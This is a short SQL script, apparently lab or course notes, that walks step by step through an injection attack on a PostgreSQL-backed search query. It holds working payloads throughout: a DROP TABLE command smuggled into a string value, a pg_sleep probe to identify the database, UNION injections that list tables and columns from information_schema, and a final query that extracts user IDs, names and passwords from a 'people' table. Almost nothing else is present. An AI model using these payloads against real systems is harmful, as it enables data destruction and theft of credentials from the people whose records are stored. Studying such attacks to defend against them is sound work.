-- This script describes how a sql injection can be carried out

SELECT id, name FROM students WHERE degree = 'Bachelor of Computer'; DROP TABLE students; -- Science';

-- Trying to understand the query as a blackbox
SELECT ?, ?, ? FROM ? WHERE ? ILIKE '%1521'; --%';

-- Enter ' and see how it breaks down

-- What database am I attacking? -- using PostgreSQL
SELECT ?, ?, ? FROM ? WHERE ? ILIKE '%1521' and pg_sleep(1) is not null; --%';

-- Union operator
SELECT ?, ?, ? FROM ? WHERE ? ILIKE '%1521' UNION SELECT 'A', 'B', 'C'; --%';

-- Find table names from metadata
SELECT ?, ?, ? FROM ? WHERE ? ILIKE '%1521' UNION SELECT table_name, table_schema, '3' FROM information_schema.tables where table_schema='public'; --%';

-- Find column name for 'people' table
SELECT ?, ?, ? FROM ? WHERE ? ILIKE '%1521' UNION SELECT column_name, '2', '3' FROM information_schema.columns where table_name = 'people'; --%';

-- Query for private data
SELECT ?, ?, ? FROM ? WHERE ? ILIKE '%1521' UNION SELECT zid, name, password FROM people; --%';
